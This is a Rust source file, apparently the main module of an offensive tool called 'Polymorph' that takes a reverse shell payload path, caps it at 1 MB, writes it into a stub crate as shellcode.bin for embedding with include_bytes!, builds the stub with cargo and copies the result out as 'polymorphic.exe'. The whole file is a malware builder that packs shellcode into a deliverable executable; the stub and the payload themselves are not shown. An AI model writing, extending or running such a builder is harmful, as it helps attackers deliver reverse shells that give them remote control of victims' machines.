mod parser;
mod pkg;
use std::path::{Path, PathBuf};
use std::process::Command;

struct Polymorph {
    output: PathBuf,
    payload: PathBuf,
}

impl Polymorph {
    fn new(output: PathBuf, payload: PathBuf) -> Self {
        Polymorph { output, payload }
    }

    fn parse_args() -> Result<Polymorph, String> {
        let args = parser::parser()?;
        let payload = args.payload.ok_or("Reverse shell payload path is required.".to_string())?;

        let metadata = std::fs::metadata(&payload).map_err(|e| format!("Failed to read payload metadata: {}", e))?;
        let file_size_mb = metadata.len() / (1024 * 1024);
        if file_size_mb > 1 {
            return Err("Payload size exceeds the maximum allowed size of 1 MB.".to_string());
        }

        let output = args.output.unwrap_or_else(|| {
            let mut output_path = payload.clone();
            output_path.set_file_name(format!("polymorphic.exe"));
            output_path
        });

        std::fs::File::create(&output).map_err(|e| format!("Failed to create output file: {}", e))?;

        Ok(Polymorph::new(output, payload))
    }

    /// Copy the payload into the stub crate as `shellcode.bin`.
    /// The stub embeds it via `include_bytes!("../shellcode.bin")`.
    fn write_payload(&self, stub_dir: &Path) -> Result<(), String> {
        let data = std::fs::read(&self.payload).map_err(|e| format!("read payload: {}", e))?;
        std::fs::write(stub_dir.join("shellcode.bin"), &data).map_err(|e| format!("write shellcode.bin: {}", e))?;
        pkg::log_info(&format!("Payload written to stub/shellcode.bin ({} bytes)",data.len()));
        Ok(())
    }
}

/// Compile the stub crate in release mode and return the built exe path.
fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
    let status = Command::new("cargo")
        .args(["build", "--release"])
        .current_dir(stub_dir)
        .status()
        .map_err(|e| format!("spawn cargo: {}", e))?;

    if !status.success() {
        return Err("stub build failed".to_string());
    }
    pkg::log_info("Stub built successfully");
    Ok(stub_dir.join("target/release/stub.exe"))
}

fn run(polymorph: &Polymorph) -> Result<(), String> {
    // The stub crate lives next to the polymorph crate.
    // Layout: polymorph/ { engine (this crate), stub/ }
    let stub_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).parent().ok_or("no parent dir")?.join("stub");

    if !stub_dir.exists() {
        return Err(format!(
            "stub directory not found at {}",
            stub_dir.display()
        ));
    }

    // Copy the payload into the stub crate.
    polymorph.write_payload(&stub_dir)?;

    // Compile the stub with the embedded payload.
    let built = build_stub(&stub_dir)?;

    // Copy the compiled stub to the requested output path.
    std::fs::copy(&built, &polymorph.output).map_err(|e| format!("copy output: {}", e))?;

    pkg::log_ok(&format!(
        "Polymorphic binary generated successfully as \"{}\".",
        polymorph.output.display()
    ));

    Ok(())
}

fn main() {
    let polymorph = match Polymorph::parse_args() {
        Ok(p) => p,
        Err(e) => {
            pkg::log_error(&e);
            std::process::exit(1);
        }
    };

    if let Err(e) = run(&polymorph) {
        pkg::log_error(&e);
        std::process::exit(1);
    }
}